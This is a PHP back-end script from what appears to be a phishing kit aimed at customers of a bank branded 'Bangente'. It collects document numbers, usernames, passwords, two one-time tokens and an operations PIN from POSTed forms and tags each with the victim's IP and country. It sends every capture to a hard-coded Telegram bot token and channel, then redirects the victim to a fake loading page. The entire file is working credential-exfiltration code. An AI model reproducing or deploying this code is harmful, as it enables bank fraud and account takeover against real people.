<?php
ini_set("display_errors", 0);

$apibot = "7550683092:AAEnTVa3-lmXmsi2iVfCTSYwGGUjcW3gK8E";
$canal =  "-1002648324808";


function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
$pais = $meta['geoplugin_countryName']; 


if (isset ($_POST['tipoDocumento']) && isset ($_POST['documento'])  && isset ($_POST['usuario'])   && isset ($_POST['passc']) ){
	
$message = "Bangente-Info\n\nTipo-Usuario: Empresas\nTipoDocumento: <code>".$_POST['tipoDocumento']."</code>\nDocumento: <code>".$_POST['documento']."</code>\nUsuario: <code>".$_POST['usuario']."</code>\nClave: <code>".$_POST['passc']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";

	
	$apiToken = $apibot;
	$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

header('Location: carga.php?u='.$_POST['usuario'].'&t=1');
	
	
}

if (isset ($_POST['usuario']) && isset($_POST['token'])  ){

$message = "Bangente-Info\n\nUsuario: <code>".$_POST['usuario']."</code>\nToken: <code>".$_POST['token']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";
	$apiToken = $apibot;
	$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

header('Location: carga.php?u='.$_POST['usuario'].'&t=2');


}

if (isset ($_POST['usuario']) && isset($_POST['token2'])  ){

$message = "Bangente-Info\n\nUsuario: <code>".$_POST['usuario']."</code>\nToken2: <code>".$_POST['token2']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";
	$apiToken = $apibot;
	$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

header('Location: carga.php?u='.$_POST['usuario'].'&t=3');


}

if (isset ($_POST['usuario']) && isset($_POST['coe'])  ){

$message = "Bangente-Info\n\nUsuario: <code>".$_POST['usuario']."</code>\nClave-operaciones: <code>".$_POST['coe']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";
	$apiToken = $apibot;
	$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

header('Location: carga.php?u='.$_POST['usuario'].'&t=4');


}





?>
